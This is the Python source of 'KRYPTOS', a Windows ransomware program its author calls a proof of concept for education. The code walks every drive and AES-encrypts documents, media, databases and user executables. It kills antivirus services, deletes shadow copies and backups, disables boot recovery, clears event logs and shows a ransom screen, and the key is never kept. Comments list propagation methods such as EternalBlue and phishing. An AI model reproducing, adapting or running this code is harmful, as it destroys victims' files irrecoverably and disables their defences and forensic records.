# ========================================================================================
#  KRYPTOS - Encrypt, Conceal, Control (A proof of concept project)
#
#  CREATED BY PHANTOM0004 (All rights reserved)
#  Check out my penetration testing repo! -> https://github.com/phantom0004/PenTest_Vault
# ========================================================================================
# ! SEE ETHICAL USAGE MESSAGE BELOW CODE BEFORE USAGE ! -> ABIDE BY THE LAW ALWAYS!
# ========================================================================================
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor
import subprocess
import mmap
import ctypes
import requests
import sys
import winreg
import win32api

# This ransomware was NEVER designed to cause harm, a kill switch similar to wannacry is implemented
def initial_check_kill():
    connect_counter = 0
    
    # Try connect to the domain for three times
    while connect_counter < 3:
        try:
            response = requests.get("http://Hd8heufhfeLSOjOoj33994fh3n2012ndu.com") # Randomly generared domain
            if response.status_code == 200:
                # Attempt to delete persistance (if active)
                if "win" in sys.platform.lower():
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                        winreg.DeleteValue(key, "SystemUpdateService")
                        winreg.CloseKey(key)
                    except:
                        pass
                kill_ransomware_file()
                sys.exit() # Exit program
            else:
                connect_counter += 1
        except requests.ConnectionError:
            connect_counter += 1

# Attempt to delete _KRYPT0S
def kill_ransomware_file(just_file_flag = 0):
    file_to_del = [os.path.abspath(__file__), "Screen.exe", "wallpaperX324HF.png"]
    
    if just_file_flag == 0:
        for file in file_to_del:
            try:
                os.remove(file)
            except:
                pass
    else:
        try:
            os.remove(file_to_del[0]) # Just remove ransom program
        except:
            pass # A permission error most of the times

    sys.exit()

# A spreading mechanisim - WILL NOT BE IMPLEMENTED
def spread():
    # Here attackers would utilize a spreading mechanism, similar to what WannaCry used, targeting SMBv1 services to propagate with its own scanner.
    # Attackers can spread such malware through various methods including but not limited to:
    #
    # 1. **Email Phishing**: Sending malicious attachments or links to unsuspecting victims, tricking them into opening the email and executing the malware.
    # 2. **Network Propagation**: Exploiting vulnerabilities in network services such as SMB (Server Message Block) to spread across the local network. This method involves:
    #    - Scanning the network for vulnerable devices.
    #    - Exploiting known vulnerabilities (e.g., EternalBlue) to gain access.
    #    - Copying the ransomware payload to the compromised devices and executing it.
    # 3. **USB Drives**: Infecting removable storage devices so that when they are plugged into other computers, the ransomware spreads.
    # 4. **Malvertising**: Using malicious advertisements on legitimate websites to distribute malware. When users click on these ads, they are redirected to a page that exploits browser vulnerabilities to download the ransomware.
    # 5. **Drive-by Downloads**: Compromising legitimate websites to serve malware. When users visit these sites, the ransomware is automatically downloaded and executed without the user's knowledge.
    # 6. **Exploiting Remote Services**: Targeting remote desktop services (RDP) or other remote access services by brute-forcing credentials or exploiting vulnerabilities.
    # 7. **File Sharing Networks**: Spreading through peer-to-peer (P2P) networks by disguising the ransomware as legitimate software.
    # 8. **Social Engineering**: Trick users into downloading and running the ransomware by pretending to be a trusted entity (e.g., a software update or a legitimate application).

    # As this function is for educational purposes only, it does not implement any actual spreading mechanism.
    pass

# Start up commands for CMD to attempt to disable security services (Mostly for admin or poor policy accounts)
def startup_commands_windows():
    win_commands = [
        "net stop WinDefend",
        "sc config WinDefend start= disabled",
        "net stop wuauserv",
        "sc config wuauserv start= disabled",
        "net stop bits",
        "sc config bits start= disabled",
        "net stop wscsvc",
        "sc config wscsvc start= disabled",
        "powershell -Command \"vssadmin delete shadows /all /quiet\"",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin delete catalog -quiet",
        "taskkill /f /im MsMpEng.exe",
        "taskkill /f /im Sophos*",
        "taskkill /f /im McAfee*",
        "net stop SysmonLog",
        "net stop SysmonDrv",
        "net stop AVP*",
        "net stop SEP*"
    ]
    
    for command in win_commands:
        result = subprocess.run(command, capture_output=True, shell=True, text=True)
        if result.returncode != 0: 
            pass

# Attempt to clear event logs after attack (Mostly for admin or poor policy accounts)
def attempt_rem_event_logs():
    win_commands = [
        "wevtutil cl System",
        "wevtutil cl Security",
        "wevtutil cl Application",
        "wevtutil cl Setup",
        "wevtutil cl ForwardedEvents",
        "wevtutil cl Microsoft-Windows-TaskScheduler/Operational",
        "wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "wevtutil cl Microsoft-Windows-WindowsUpdateClient/Operational",
        "wevtutil cl Microsoft-Windows-GroupPolicy/Operational",
        "wevtutil cl Microsoft-Windows-PowerShell/Operational",
        "wevtutil cl Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
        "wevtutil cl Microsoft-Windows-Security-Auditing",
        "wevtutil cl Microsoft-Windows-WinRM/Operational",
        "wevtutil cl Windows PowerShell"
    ]
    
    for command in win_commands:
        result = subprocess.run(command, capture_output=True, shell=True, text=True)
        if result.returncode != 0: 
            pass

# Gather all drives used inside system
def list_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    
    if not drives:
        drives = ["C:\\"] # Since C: drive is a universal drive
        
    return drives

# Launch ransom screen (as .exe format)
def launch_gui():
    try:
        path = os.path.join(os.getcwd(), "Screen.exe")
        subprocess.Popen([path])
    except:
        pass # Ignore if cannot launch for some reason

# Generate temporary AES symetric key
def generate_key():
    return get_random_bytes(32)

# Encrypt and corrupt file chosen
def encrypt_file(file_path, key, size_threshold):
    try:
        file_size = os.path.getsize(file_path)
        file_chunk = file_size // 4
    except:
        file_size = None  # Default Value

    try:
        if file_size and file_size > size_threshold:
            with open(file_path, "rb") as file:
                # Read file header
                file_header = file.read(file_chunk)

                # Read file footer
                file.seek(-file_chunk, os.SEEK_END)
                file_footer = file.read(file_chunk)
        else:
            # Read entire content
            with open(file_path, "rb") as file:
                file_content = file.read()

        if file_size and file_size > size_threshold:
            encrypted_data_header = process_data(key, file_header)
            encrypted_data_footer = process_data(key, file_footer)
        else:
            encrypted_data = process_data(key, file_content)

        if file_size and file_size > size_threshold:
            with open(file_path, "r+b") as file:
                file.seek(0)
                file.write(encrypted_data_header)
                file.seek(-file_chunk, os.SEEK_END)
                file.write(encrypted_data_footer)
        else:
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)

        rename_file_with_counter(file_path, '.krypt')
    except PermissionError:
        try:
            rename_file_with_counter(file_path, '.krypt')
        except PermissionError:
            pass
    except:
        pass

# Rename file extension with KRYTPOS tag
def rename_file_with_counter(file_path, new_extension):
    base = os.path.splitext(file_path)[0]
    new_filename = base + new_extension
    file_counter = 1

    try:
        os.rename(file_path, new_filename)
    except FileExistsError:
        while True:
            new_filename_with_counter = f"{base}({file_counter}){new_extension}"
            if not os.path.isfile(new_filename_with_counter):
                os.rename(file_path, new_filename_with_counter)
                break
            file_counter += 1

def enumerate_username():
    try:
        username = os.getlogin() # Get username
    except:
        try:
            username = os.environ.get('USERNAME') # Try username through enviromental variables
        except:
            pass
        
    if not username:
        try:
            result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
            username = result.stdout.strip().split('\\')[-1]
        except:
            pass
    
    return username

# Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
def traverse_encrypt(drive, key): 
    size_threshold = 20971520      
    extensions = (
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.png', '.jpg', 
        '.jpeg', '.bmp', '.gif', '.mp3', '.wav', '.mp4', '.mov', '.zip', '.rar', '.7z', 
        '.tar', '.bak', '.sql', '.xml', '.html', '.db', '.pst', '.docm', '.xlsm'
    )

    def get_main_dirs(username, drive):     
        # Construct dynamic destructive path
        main_dirs = [
            # Main folders of user
            os.path.join(drive, f"Users\\{username}\\Downloads"),
            os.path.join(drive, f"Users\\{username}\\Documents"),
            os.path.join(drive, f"Users\\{username}\\Music"),
            os.path.join(drive, f"Users\\{username}\\Pictures"),
            os.path.join(drive, f"Users\\{username}\\Desktop"),
            os.path.join(drive, f"Users\\{username}\\Videos"),
            os.path.join(drive, f"Users\\{username}\\Favorites"),
            # Cloud based paths
            os.path.join(drive, f"Users\\{username}\\OneDrive"),
            os.path.join(drive, f"Users\\{username}\\Google Drive"),
            os.path.join(drive, f"Users\\{username}\\Dropbox"),
            os.path.join(drive, f"Users\\{username}\\iCloudDrive"),
            os.path.join(drive, f"Users\\{username}\\Box Sync"),
            # System used paths
            os.path.join(drive, f"Users\\{username}\\AppData\\Roaming"),
            os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Packages"),
            os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Temp"),
        ]
        return main_dirs
    
    for root, _, files in os.walk(drive):
        # Get username for each drive
        username = enumerate_username()
        # Generate .exe path for each drive
        main_dirs = get_main_dirs(username, drive)
        
        for file in files:
            # Skip KRYPT0S files
            if file == "Screen.exe" or file == os.path.basename(__file__) or file == "wallpaperX324HF.png":
                continue    
            
            # Encrypt files that match the extensions saved
            if any(file.endswith(ext) for ext in extensions):
                encrypt_file(os.path.join(root, file), key, size_threshold)
            
            # Encyrpt files with the .exe extension
            if file.endswith('.exe') and username:
                if any(root.startswith(main_dir) for main_dir in main_dirs):
                    encrypt_file(os.path.join(root, file), key, size_threshold)
        
# With threading, attept to traverse and encrypt the found files, use system cores to speed up the process
def parallel_search(drives, key):
    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = [executor.submit(traverse_encrypt, drive, key) for drive in drives]
        for future in futures:
            future.result()

def process_data(key, file_content):
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
    
    return encrypted_data

def check_debugging_and_virtualization():
    # Detect debugging
    debugging = ctypes.windll.kernel32.IsDebuggerPresent() != 0

    # Detect virtualization
    virtualization = False
    try:
        result = subprocess.run(["wmic", "computersystem", "get", "model"], capture_output=True, text=True, shell=True)
        model = result.stdout.lower()
        virtualization_keywords = ["virtual", "vmware", "vbox", "qemu", "xen"]
        if any(keyword in model for keyword in virtualization_keywords):
            virtualization = True
    except:
        pass

    if debugging or virtualization:
        # Destroy file and all its contents
        kill_ransomware_file()

        # Exit if debugging or virtualization detected
        sys.exit() 

# Zero out the key in memory several times
def zero_memory(buffer):
    length = len(buffer)
    # First pass: write all ones (0xFF)
    for i in range(length):
        buffer[i] = 0xFF
    # Second pass: write all zeros (0x00)
    for i in range(length):
        buffer[i] = 0x00

# Attempt to move generated key out of memory
def key_to_ram(key):
    key_len = len(key)
    mm = mmap.mmap(-1, key_len, access=mmap.ACCESS_WRITE)
    mm.write(key)
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualLock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))
    
    return mm, key_len, kernel32

# Change the wallpaper of the user to indicate an attack
def change_windows_wallpaper():
    wallpaper_path = os.path.join(os.getcwd(), 'wallpaperX324HF.png')
    SPI_SETDESKWALLPAPER = 0x0014
    
    try:    
        # Update registry to reflect changes        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Control Panel\Desktop', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "10") 
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        
        # Apply changes
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)
    except:
        # Dont do anything if the above fails just in case
        return

# Zero out the memory and unlock memory again
def zero_and_unlock(mm, key_len, kernel_memory):
    # Zero out the memory after use
    zero_memory(mm)

    # Unlock the memory and close mmap
    kernel_memory.VirtualUnlock(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mm))), ctypes.c_size_t(key_len))
    mm.close()

# Main part, run all functions
def main():
    # Since running on a sandbox is the only usage for this ransomware, I commented the function call out.
    # check_debugging_and_virtualization()
    
    # Start up commands and kill switch check
    initial_check_kill()
    startup_commands_windows()
    
    # Key generation and drive enumeration
    key = generate_key()
    mm, key_len, kernel_memory = key_to_ram(key)
    drives = list_drives()  
    
    # Start the attack
    parallel_search(drives, mm[:key_len])

    # In a real life attack, this function would exist and propogate 
    spread() # See function body for comment of ideas
    
    # Clean up tracks
    zero_and_unlock(mm, key_len, kernel_memory)
    zero_memory(key)
    attempt_rem_event_logs()
    
    # Change wallpaper and show ransom screen
    change_windows_wallpaper()
    launch_gui() 

    # Destroy ransomware file (Still keeping the ransomware screen and others)
    kill_ransomware_file(1)

if __name__ == "__main__":    
    main() # Launch _KRYPT0S

# I AM NOT RESPONSIBLE FOR ANY MISDOINGS
# 
# This project is intended for educational purposes only. The creator does not condone or endorse any malicious use of this code.
# 
# By using this project, you agree to use it responsibly and ethically. Any misuse of this code that results in harm or damage to systems,
# individuals, or organizations is solely the responsibility of the user.
# 
# Please use this project to learn and improve your understanding of cybersecurity concepts, and always practice good ethics and legal compliance.
# 
# Remember, with great power comes great responsibility!
